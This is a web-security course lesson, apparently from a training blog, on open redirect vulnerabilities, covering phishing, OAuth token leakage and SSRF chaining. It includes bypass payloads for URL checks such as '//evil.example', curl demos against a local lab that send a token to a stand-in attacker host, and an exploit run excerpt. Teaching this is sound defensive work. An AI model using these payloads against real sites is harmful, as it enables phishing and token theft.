---
title: "Lesson 6.3: Open Redirect and Its Abuse"
image:
  path: /assets/img/covers/web-6-3-open-redirect-abuse.webp
  alt: "Open Redirect and Its Abuse"
date: 2024-06-15 14:15:00 +0700
categories: ["Web Security", "Web · SSRF and Request-Side"]
tags: [web, open-redirect, ssrf]
render_with_liquid: false
---

After this lesson you understand what an open redirect is, why URL checks often go wrong, and how it is used for phishing, token leakage, and chaining with SSRF. The labs here run on your own machine or on systems you are authorized to test.

![Open Redirect and Its Abuse](/assets/img/web/web-6-3-open-redirect-abuse.svg)
_A trusted host sends a 302 to a URL the attacker chose, and a token in that URL leaks with it._

Part: 6 | Time: about 25 minutes | Difficulty: basic

**Prerequisites:** Lesson 6.1 (Basic SSRF).

**Tools:** Burp Suite, curl.

## Goals

After this lesson you understand open redirect and where it shows up, you can recognize the broken URL checks and how to beat them, you can see the three ways it is abused (phishing, token leakage, chaining with SSRF), and you know how to defend correctly.

## 1. Theory

### 1.1 What an open redirect is

An open redirect happens when an application redirects the user to a URL supplied by the user, without checking (or by checking wrongly) whether that URL is valid. The common spots are parameters used after login or after an action:

```text
/login?next=/dashboard
/logout?returnUrl=/home
/redirect?url=https://...
/go?to=...
```

Redirecting based on a parameter is itself a valid feature (returning to the page you were on before login). It becomes a vulnerability when the destination can point anywhere the attacker likes.

### 1.2 Broken URL checks

- No check at all: redirect straight to anywhere.
- Checking "must start with /": beaten with `//evil.example` (a scheme-less, protocol-relative URL, which the browser reads as `https://evil.example`), or `/\evil.example` (some browsers treat `\` like `/`).
- Checking "must contain our own domain": beaten with `https://evil.example/trusted.local`, `https://trusted.local.evil.example`, `https://evil.example?x=trusted.local`.
- Checking with startswith on a domain: beaten with `https://trusted.local.evil.example`.

The root cause is string matching instead of parsing the URL properly and comparing the host.

### 1.3 Three ways to abuse it

1. Phishing: the starting link is on the real, trusted domain (`https://bank.com/go?url=...`) but pushes the victim to a fake login page. The victim sees a familiar domain and lets their guard down.
2. Token leakage: in an OAuth/SSO flow, if the `redirect_uri` is open, the code or token attached to the redirect URL flies off to the attacker's domain (through the query string, or through the Referer header when the target page loads a resource). This connects directly to Lesson 4.4 (OAuth).
3. Chaining with SSRF: an open redirect on an allowed host becomes a stepping stone for bypassing an SSRF filter (see Lesson 6.2, the `/bounce` endpoint). The filter approves the initial URL (a valid host), then the client follows the 302 to an internal target.

## 2. Demo

An open redirect does not "fetch" anything for you. It returns a 302 response with a `Location` header for the BROWSER to follow. So when you test, turn off automatic redirect following and read the `Location` header to see where the victim will be sent.

```text
$ curl -s -i 'localhost:8059/go?url=https://evil.example/phish' | grep -i -E 'HTTP/|^location'
HTTP/1.1 302 FOUND
Location: https://evil.example/phish
```

And token leakage through an open `next` parameter:

```text
$ curl -s -i 'localhost:8059/sso?next=https://evil.example/collect' | grep -i location
Location: https://evil.example/collect?token=FLAG%7B6.3_open_redirect_ro_ri_token%7D
```

The token (here the flag) is attached to the redirect URL and flies straight to the attacker's domain. The value is percent-encoded (`%7B` is `{`), which decodes to `FLAG{...}`.

## 3. Lab

- Vulnerable app: `labs/6.3/` (runs locally on 127.0.0.1:8059).
- Task:
  1. `/go?url=` redirects to an external site (phishing).
  2. `/login?next=` only checks `startswith("/")`, bypassed with `//evil.example`.
  3. `/sso?next=` attaches a token to the redirect URL, which leaks the token when `next` points outward.
- Hint: read the `Location` header with `curl -i` or Burp (turn off follow redirect).
- Solution: `labs/6.3/exploit.py` and `labs/6.3/transcript.txt`.

An excerpt from a real run:

```text
[*] Buoc 2: vuot kiem 'chi URL noi bo' o /login?next=
    next=//evil.example/phishing [302] Location: //evil.example/phishing      RA NGOAI!
[*] Buoc 3: ro ri token SSO qua next mo
    Location (da giai ma): https://evil.example/collect?token=FLAG{6.3_open_redirect_ro_ri_token}
[+] Open redirect xac nhan. FLAG = FLAG{6.3_open_redirect_ro_ri_token}
```

## 4. Common pitfalls

- Checking only the string (contains/startswith) instead of parsing the URL and comparing the host.
- Forgetting that `//host` is a protocol-relative URL.
- Putting a token or secret in the query of a redirect URL.
- Rating open redirect as "low risk" and moving on. It is strong when chained with OAuth or SSRF.

## 5. Further reading

- PortSwigger Web Security Academy: DOM-based open redirection and the redirect labs.
- OWASP WSTG: Testing for Client-side URL Redirect.
- Bug bounty write-ups about open redirect leading to account takeover through OAuth.
- Tools: Burp Suite.

## 6. Key takeaways

- Open redirect means redirecting to a user-supplied URL without a correct check.
- A "starts with /" check is easy to beat with `//` and `/\`.
- It is used for convincing phishing, for leaking OAuth tokens, and as a stepping stone for an SSRF filter bypass.
- When testing, read the Location header and do not let the client follow the redirect for you.
- Defense: allowlist internal hosts/paths, map through an ID, force the destination to the same origin, and never put a token in a redirect URL.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 6.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/6.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/6.3/app.py" download><i class="fa-solid fa-file-code"></i>app.py</a>
<a class="lab-file" href="/assets/labs-web/6.3/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
</div>
</div>
